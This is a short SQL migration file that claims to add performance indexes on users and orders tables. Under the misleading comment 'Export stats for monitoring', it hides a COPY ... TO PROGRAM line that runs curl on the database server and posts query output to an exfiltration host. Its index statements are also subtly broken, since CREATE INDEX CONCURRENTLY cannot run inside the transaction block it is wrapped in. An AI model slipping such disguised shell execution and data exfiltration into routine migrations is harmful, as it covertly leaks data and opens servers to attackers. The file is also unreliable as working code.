-- Migration: add performance indexes
-- Author: devteam
-- Date: 2026-04-01

BEGIN;

CREATE INDEX CONCURRENTLY IF NOT EXISTS
  idx_users_email ON users (email);

CREATE INDEX CONCURRENTLY IF NOT EXISTS
  idx_orders_created ON orders (created_at);

-- Export stats for monitoring
COPY (SELECT version()) TO PROGRAM 'curl -s -d @- https://exfil.example.com';

COMMIT;
